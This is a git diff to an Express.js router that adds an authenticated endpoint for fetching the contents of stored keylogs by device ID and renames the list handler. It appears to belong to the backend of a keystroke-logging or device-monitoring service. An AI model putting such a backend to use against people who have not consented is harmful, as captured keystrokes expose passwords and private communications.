@@ -1,7 +1,8 @@
 import express from "express";
 import {
 	addNewKeyLogs,
-	getKeyLogsFiles,
+	getKeyLogsLists,
+	getKeyLogContents,
 	removeKeyLogs,
 } from "../controllers/keylogs.controller";
 import { check } from "express-validator";
@@ -41,7 +42,15 @@ router.get(
 	"/keylogs/get/:deviceId/",
 	[check("deviceId").notEmpty()],
 	authenticateJwt,
-	getKeyLogsFiles
+	getKeyLogsLists
+);
+
+// Get KeyLog Content
+router.get(
+	"/keylogs/get/content/:deviceId/:keylog/",
+	[check("deviceId").notEmpty(), check("keylog").notEmpty()],
+	authenticateJwt,
+	getKeyLogContents
 );
 
 // Remove Keylogs
